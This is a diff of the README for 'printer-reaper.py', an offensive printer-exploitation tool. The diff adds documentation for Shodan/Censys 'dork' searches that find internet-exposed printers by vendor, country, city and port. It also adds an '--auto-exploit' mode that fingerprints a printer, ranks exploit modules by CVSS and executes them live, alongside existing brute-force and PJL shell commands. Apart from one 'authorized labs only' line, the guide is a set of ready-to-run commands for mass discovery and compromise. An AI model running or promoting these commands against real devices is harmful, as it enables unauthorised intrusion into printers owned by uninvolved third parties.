@@ -117,19 +117,19 @@ python printer-reaper.py [target] [mode] [options]
 | `python printer-reaper.py 192.168.1.100 --scan` | Passive fingerprint + CVE scan |
 | `python printer-reaper.py 192.168.1.100 pjl` | PJL interactive shell |
 | `python printer-reaper.py 192.168.1.100 --bruteforce --bf-vendor epson` | Credential brute-force |
+| `python printer-reaper.py 192.168.1.100 --auto-exploit` | Auto exploit selection + execution |
 | `python printer-reaper.py 192.168.1.100 --attack-matrix` | Full attack campaign |
-| `python printer-reaper.py 192.168.1.100 --xpl-list` | List all exploit modules |
+| `python printer-reaper.py --discover-online --dork-vendor hp --dork-country BR` | Dork-based online discovery |
 
 ---
 
 ## 1. Discovery
 
-```bash
-# SNMP sweep + installed printers on host
-python printer-reaper.py --discover-local
+### Local
 
-# Online — Shodan / Censys (needs API keys in config.json)
-python printer-reaper.py --discover-online
+```bash
+# SNMP sweep + installed printers on this host
+python printer-reaper.py --discover-local
 
 # Passive OSINT check for a specific IP
 python printer-reaper.py 192.168.1.100 --osint
@@ -137,6 +137,56 @@ python printer-reaper.py 192.168.1.100 --osint
 # Detect supported languages without connecting
 python printer-reaper.py 192.168.1.100 --auto-detect
 ```
+
+### Online — Structured Dork Discovery (v3.8.0)
+
+`--discover-online` now uses structured dork parameters. **Printer context is always implicit** — no need to specify "printer" in searches. At least one `--dork-*` filter is required.
+
+```bash
+# All Epson + Ricoh printers in Latin America with port 515
+python printer-reaper.py --discover-online \
+  --dork-vendor epson --dork-vendor ricoh \
+  --dork-region latin_america \
+  --dork-port 515
+
+# HP DeskJet Pro 5500 in Brazil
+python printer-reaper.py --discover-online \
+  --dork-vendor hp \
+  --dork-model "deskjet pro 5500" \
+  --dork-country brazil
+
+# All printers in São Paulo with port 9100
+python printer-reaper.py --discover-online \
+  --dork-country BR \
+  --dork-city "Sao Paulo" \
+  --dork-port 9100
+
+# Kyocera in Europe, 200 results
+python printer-reaper.py --discover-online \
+  --dork-vendor kyocera \
+  --dork-region europe \
+  --dork-limit 200
+
+# Multiple vendors, countries and ports
+python printer-reaper.py --discover-online \
+  --dork-vendor hp --dork-vendor canon \
+  --dork-country BR --dork-country AR \
+  --dork-port 9100 --dork-port 631
+```
+
+**Dork flags:**
+
+| Flag | Repeatable | Description |
+|------|-----------|-------------|
+| `--dork-vendor VENDOR` | Yes | Vendor: hp, epson, ricoh, brother, canon, kyocera, xerox, lexmark, samsung, oki, zebra, ... |
+| `--dork-model MODEL` | No | Model substring in banner |
+| `--dork-country COUNTRY` | Yes | ISO code or name (pt-BR/en): BR, brazil, argentina, DE, germany... |
+| `--dork-city CITY` | No | City name |
+| `--dork-region REGION` | Yes | latin\_america, south\_america, europe, eastern\_europe, asia, southeast\_asia, middle\_east, africa, oceania, north\_america |
+| `--dork-port PORT` | Yes | 9100 (RAW/PJL), 515 (LPD), 631 (IPP), 80, 443 |
+| `--dork-org ORG` | No | Organization/ISP name |
+| `--dork-cpe CPE` | No | CPE filter (Censys only) |
+| `--dork-limit N` | No | Max results per query (default: 100) |
 
 ---
 
@@ -192,7 +242,46 @@ python printer-reaper.py 192.168.1.100 pjl -i commands.txt -o session.log -q
 
 ---
 
-## 4. Credential Brute-Force
+## 4. Auto Exploit (v3.8.0)
+
+Automatic exploit selection, verification, parameter pre-filling, and execution.
+
+```bash
+# Auto exploit (dry-run — safe)
+python printer-reaper.py 192.168.1.100 --auto-exploit
+
+# With serial number pre-filled to exploits that require it
+python printer-reaper.py 192.168.1.100 --auto-exploit --bf-serial XAABT77481
+
+# Live exploitation — AUTHORIZED LABS ONLY
+python printer-reaper.py 192.168.1.100 --auto-exploit --no-dry
+
+# Restrict to a specific source
+python printer-reaper.py 192.168.1.100 --auto-exploit --xpl-source exploit-db
+
+# Check more candidates, run top 3
+python printer-reaper.py 192.168.1.100 --auto-exploit \
+  --auto-exploit-limit 15 \
+  --auto-exploit-run 3
+
+# Force a custom exploit file (parameters auto-filled)
+python printer-reaper.py 192.168.1.100 --auto-exploit \
+  --auto-exploit-file /path/to/my_exploit.py \
+  --bf-serial XAABT77481
+```
+
+**Algorithm:**
+1. Quick fingerprint (banner grab, SNMP, HTTP, IPP)
+2. Match exploit modules against detected make/model/firmware/CVEs
+3. Sort candidates by CVSS score descending
+4. Run non-destructive `check()` on top N candidates
+5. Pre-fill `host`, `port`, `serial`, `mac`, `vendor` automatically
+6. Execute `run()` on top confirmed-vulnerable exploit(s)
+7. Print ranked summary of all checked exploits
+
+---
+
+## 5. Credential Brute-Force
 
 ```bash
 # Auto-detect vendor, use default wordlist
@@ -476,7 +565,8 @@ All flow diagrams are editable in [diagrams.net / draw.io](https://app.diagrams.
 
 | Version | Date | Highlights |
 |---------|------|------------|
-| **3.7.0** | 2026-03-25 | Zero hardcoded creds, wordlist engine, draw.io diagrams, PNG assets |
+| **3.8.0** | 2026-03-25 | Structured dork discovery (Shodan/Censys), `--auto-exploit` pipeline, `DiscoveryParams`, `DorkQueryBuilder`, `auto_exploit()` |
+| 3.7.0 | 2026-03-25 | Zero hardcoded creds, wordlist engine, draw.io diagrams, PNG assets |
 | 3.6.2 | 2026-03-25 | LDAP hash capture, CVE-2024-51978, 5 new vendors |
 | 3.6.0 | 2026-03-24 | 7 new BlackHat 2017 exploits + EDB research modules |
 | 3.5.0 | 2026-03-24 | `--send-job`, wordlists subfolder, emoji-free CLI |
